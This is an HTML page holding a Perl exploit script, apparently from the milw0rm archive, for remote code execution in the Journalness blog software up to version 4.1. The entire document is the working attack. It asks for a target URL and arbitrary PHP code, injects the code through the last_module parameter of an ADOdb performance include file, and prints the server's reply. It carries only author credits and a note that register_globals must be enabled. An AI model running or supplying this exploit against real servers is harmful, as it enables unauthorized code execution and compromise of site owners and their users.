<html><head><title>Journalness <= 4.1 (last_module) Remote Code Execution exploit</title></head><pre>#!/usr/bin/perl
#
#	Vendor url: journalness.sourceforge.net
#
# note: exploit requires Register_globals = On in php.ini
#							~Iron
#							http://www.randombase.com
require LWP::UserAgent;

print &quot;#
# Journalness &lt;= 4.1 Remote Code Execution exploit
# By Iron - randombase.com
# Greets to everyone at RootShell Security Group &amp; dHack
#
# Example target url: http://www.target.com/journalnessdir/
Target url?&quot;;
chomp($target=&lt;stdin&gt;);
if($target !~ /^http:\/\//)
{
	$target = &quot;http://&quot;.$target;
}
if($target !~ /\/$/)
{
	$target .= &quot;/&quot;;
}
print &quot;PHP code to evaluate? &quot;;
chomp($code=&lt;stdin&gt;);
$code =~ s/(&lt;\?php|\?&gt;|&lt;\?)//ig;
$target .= &quot;includes/database/adodb-perf-module.inc.php?last_module=t{};%20class%20t{};&quot;.$code.&quot;//&quot;;

$ua = LWP::UserAgent-&gt;new;
$ua-&gt;timeout(10);
$ua-&gt;env_proxy;

$response = $ua-&gt;get($target);

if ($response-&gt;is_success)
{
	print &quot;\n&quot;.&quot;#&quot; x 20 .&quot;\n&quot;;
	print $response-&gt;content;
	print &quot;\n&quot;.&quot;#&quot; x 20 .&quot;\n&quot;;
}
else
{
 die &quot;Error: &quot;.$response-&gt;status_line;
}

# milw0rm.com [2008-02-09]</pre></html>